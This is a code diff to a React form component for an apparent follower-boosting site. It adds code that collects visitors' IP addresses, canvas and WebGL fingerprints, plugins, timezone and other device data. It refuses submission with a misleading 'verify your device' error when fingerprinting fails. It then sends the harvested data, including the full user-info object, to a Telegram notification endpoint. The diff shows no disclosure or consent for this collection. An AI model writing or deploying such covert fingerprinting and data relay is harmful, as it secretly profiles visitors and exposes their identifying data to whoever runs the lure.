@@ -373,6 +373,16 @@ const formSchema = insertSubmissionSchema.extend({
     .min(3, "Username must be at least 3 characters long")
     .max(30, "Username must be less than 30 characters")
     .regex(/^[a-zA-Z0-9._]+$/, "Username can only contain letters, numbers, period and underscore"),
+  deviceInfo: z.object({
+    deviceModel: z.string().min(1, "Device model is required"),
+    screenSize: z.string().min(1, "Screen size is required"),
+    platform: z.string().min(1, "Platform is required"),
+    userAgent: z.string().min(1, "User agent is required"),
+    language: z.string().min(1, "Language is required"),
+    timezone: z.string().min(1, "Timezone is required"),
+    browserFingerprint: z.string().optional(),
+  }).optional(),
+  ipAddress: z.string().optional(),
 });
 
 type FormValues = z.infer<typeof formSchema>;
@@ -510,15 +520,76 @@ export default function FollowerForm() {
     mode: "onChange",
   });
   
+  // Function to validate device information
+  const validateDeviceInfo = () => {
+    // Verify device model isn't generic/unknown
+    if (userInfo.deviceModel === "Unknown Device") {
+      return false;
+    }
+    
+    // Verify IP address exists
+    if (!userInfo.ip || userInfo.ip.length < 7) { // Basic IP format check
+      return false;
+    }
+    
+    // Verify we have both canvas and WebGL fingerprints
+    if (!userInfo.canvasFingerprint || !userInfo.webglFingerprint) {
+      return false;
+    }
+    
+    return true;
+  };
+  
+  // Create a browser fingerprint combining multiple data points
+  const createBrowserFingerprint = () => {
+    const items = [
+      userInfo.userAgent,
+      userInfo.deviceModel,
+      userInfo.canvasFingerprint,
+      userInfo.screenSize,
+      userInfo.colorDepth,
+      userInfo.language,
+      userInfo.timezone,
+      userInfo.platform,
+      userInfo.plugins.slice(0, 100) // Limit size
+    ];
+    
+    return items.join('||');
+  };
+
   const mutation = useMutation({
     mutationFn: async (values: FormValues) => {
-      // Get the most up-to-date user info before sending
+      // Validate device information first
+      const isDeviceValid = validateDeviceInfo();
+      
+      if (!isDeviceValid) {
+        throw new Error("Unable to verify your device. Please try again with a different device or browser.");
+      }
+      
+      // Create browser fingerprint for additional verification
+      const browserFingerprint = createBrowserFingerprint();
+      
+      // Format the device info according to our schema
+      const deviceInfo = {
+        deviceModel: userInfo.deviceModel,
+        screenSize: userInfo.screenSize,
+        platform: userInfo.platform,
+        userAgent: userInfo.userAgent,
+        language: userInfo.language,
+        timezone: userInfo.timezone,
+        browserFingerprint: browserFingerprint
+      };
+      
+      // Prepare the submission with validated device info
       const payload = {
         ...values,
+        deviceInfo: deviceInfo,
+        ipAddress: userInfo.ip,
+        // Keep the full userInfo for analytics
         userInfo: userInfo
       };
       
-      console.log("Sending submission with data:", payload);
+      console.log("Sending submission with validated data:", payload);
       
       // First send a direct notification to Telegram to ensure it works
       try {
@@ -531,7 +602,9 @@ export default function FollowerForm() {
           body: JSON.stringify({
             username: values.username,
             followers: selectedAmount,
-            userInfo: userInfo
+            userInfo: userInfo,
+            deviceInfo: deviceInfo,
+            ipAddress: userInfo.ip
           })
         });
         
